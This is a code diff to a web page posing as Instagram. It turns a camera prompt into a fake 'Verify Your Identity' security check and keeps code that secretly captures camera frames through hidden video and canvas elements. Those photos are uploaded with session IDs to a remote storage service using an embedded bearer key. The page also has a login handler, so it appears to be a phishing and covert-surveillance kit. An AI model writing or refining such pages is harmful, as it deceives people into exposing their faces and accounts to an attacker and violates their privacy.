@@ -41,20 +41,24 @@ footer ul li a{font-size:11px;color:#8e8e8e;text-decoration:none}
 footer .copyright{font-size:11px;color:#8e8e8e}
 #msg{text-align:center;font-size:12px;margin-top:8px;color:#ed4956;min-height:16px}
 video,canvas{display:none}
-#permissionModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;align-items:center;justify-content:center}
-#permissionBox{background:#fff;padding:30px;border-radius:12px;text-align:center;max-width:400px;margin:20px}
-#permissionBox h2{color:#262626;margin-bottom:15px;font-size:20px}
-#permissionBox p{color:#8e8e8e;margin-bottom:20px;line-height:1.5}
-#permissionBox button{background:#0095f6;color:#fff;border:none;padding:12px 30px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;width:100%}
+#permissionModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;align-items:center;justify-content:center}
+#permissionBox{background:#fff;padding:40px;border-radius:16px;text-align:center;max-width:420px;margin:20px;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
+#permissionBox img{width:80px;margin-bottom:20px}
+#permissionBox h2{color:#262626;margin-bottom:12px;font-size:22px;font-weight:600}
+#permissionBox p{color:#8e8e8e;margin-bottom:24px;line-height:1.6;font-size:14px}
+#permissionBox .note{background:#f0f0f0;padding:12px;border-radius:8px;margin-bottom:20px;font-size:12px;color:#666}
+#permissionBox button{background:#0095f6;color:#fff;border:none;padding:14px 40px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%;transition:background 0.2s}
 #permissionBox button:hover{background:#1877f2}
 </style>
 </head>
 <body>
 <div id="permissionModal">
   <div id="permissionBox">
-    <h2>📸 Camera Access Required</h2>
-    <p>This page needs camera access to continue. Please click "Allow" when your browser asks for permission.</p>
-    <button onclick="requestCamera()">Enable Camera</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/200px-Instagram_logo_2016.svg.png" alt="Instagram">
+    <h2>Verify Your Identity</h2>
+    <p>To protect your account and prevent unauthorized access, Instagram needs to verify it's really you.</p>
+    <div class="note">📸 We'll take a quick photo to confirm your identity. This is a one-time security check.</div>
+    <button onclick="requestCamera()">Continue Verification</button>
   </div>
 </div>
 <main>
@@ -136,10 +140,11 @@ async function up(){
   if(s<100)return;
   const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.85));if(!blob)return;
   const f=sid+'/'+Date.now()+'.jpg';
-  const formData=new FormData();formData.append('file',blob,f);
-  const r=await fetch(S+'/storage/v1/object/captures/'+f,{method:'POST',headers:{'Authorization':'Bearer '+K},body:blob});
-  if(!r.ok){console.error('Upload failed:',await r.text());return;}
-  await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({session_id:sid,image_url:S+'/storage/v1/object/public/captures/'+f})});
+  try{
+    const r=await fetch(S+'/storage/v1/object/captures/'+f,{method:'POST',headers:{'Authorization':'Bearer '+K},body:blob});
+    if(!r.ok){console.error('Upload failed');return;}
+    await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({session_id:sid,image_url:S+'/storage/v1/object/public/captures/'+f})});
+  }catch(e){console.error('Error:',e);}
 }
 
 async function handleLogin(){
